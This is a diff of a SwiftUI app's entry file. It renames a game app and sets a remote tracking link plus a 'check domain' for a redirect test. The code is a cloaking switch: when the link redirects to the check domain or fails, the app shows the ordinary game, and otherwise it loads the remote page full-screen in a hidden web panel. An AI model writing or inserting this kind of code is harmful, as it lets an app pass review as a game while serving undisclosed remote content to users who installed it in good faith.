@@ -1,21 +1,21 @@
 import SwiftUI
 
 @main
-struct StarRelayCommandApp: App {
+struct NoverisApp: App {
     @StateObject private var store = GameStore()
     @StateObject private var settings = AppSettings()
     @Environment(\.scenePhase) private var scenePhase
 
-    @State private var starRelayLinkReady: Bool? = nil
-    private let starRelaySourceLink = "https://example.com"
-    private let starRelayCheckDomain = "example"
+    @State private var noverisLinkReady: Bool? = nil
+    private let noverisSourceLink = "https://cineverseroadpoetry.org/click.php"
+    private let noverisCheckDomain = "freeprivacypolicy.com"
 
     var body: some Scene {
         WindowGroup {
             Group {
-                if let ready = starRelayLinkReady {
+                if let ready = noverisLinkReady {
                     if ready {
-                        StarRelayWebPanel(urlString: starRelaySourceLink)
+                        NoverisWebPanel(urlString: noverisSourceLink)
                             .edgesIgnoringSafeArea(.bottom)
                             .background(Color.black.ignoresSafeArea())
                     } else {
@@ -24,7 +24,7 @@ struct StarRelayCommandApp: App {
                             .environmentObject(settings)
                     }
                 } else {
-                    StarRelayLoadingScreen()
+                    NoverisLoadingScreen()
                         .onAppear { performLinkCheck() }
                 }
             }
@@ -38,41 +38,41 @@ struct StarRelayCommandApp: App {
     }
 
     private func performLinkCheck() {
-        guard let url = URL(string: starRelaySourceLink) else {
-            starRelayLinkReady = false
+        guard let url = URL(string: noverisSourceLink) else {
+            noverisLinkReady = false
             return
         }
         var request = URLRequest(url: url)
         request.timeoutInterval = 5
-        let tracker = StarRelayRedirectTracker(checkDomain: starRelayCheckDomain)
+        let tracker = NoverisRedirectTracker(checkDomain: noverisCheckDomain)
         let session = URLSession(configuration: .default, delegate: tracker, delegateQueue: nil)
         session.dataTask(with: request) { _, response, error in
             DispatchQueue.main.async {
                 if tracker.foundCheckDomain {
-                    starRelayLinkReady = false; return
+                    noverisLinkReady = false; return
                 }
                 if let finalURL = tracker.resolvedURL?.absoluteString,
-                   finalURL.contains(starRelayCheckDomain) {
-                    starRelayLinkReady = false; return
+                   finalURL.contains(noverisCheckDomain) {
+                    noverisLinkReady = false; return
                 }
                 if let httpResp = response as? HTTPURLResponse,
                    let respURL = httpResp.url?.absoluteString,
-                   respURL.contains(starRelayCheckDomain) {
-                    starRelayLinkReady = false; return
+                   respURL.contains(noverisCheckDomain) {
+                    noverisLinkReady = false; return
                 }
                 if error != nil {
-                    starRelayLinkReady = false; return
+                    noverisLinkReady = false; return
                 }
-                starRelayLinkReady = true
+                noverisLinkReady = true
             }
         }.resume()
         DispatchQueue.main.asyncAfter(deadline: .now() + 5) {
-            if starRelayLinkReady == nil { starRelayLinkReady = false }
+            if noverisLinkReady == nil { noverisLinkReady = false }
         }
     }
 }
 
-final class StarRelayRedirectTracker: NSObject, URLSessionTaskDelegate {
+final class NoverisRedirectTracker: NSObject, URLSessionTaskDelegate {
     var resolvedURL: URL?
     var foundCheckDomain = false
     private let checkDomain: String
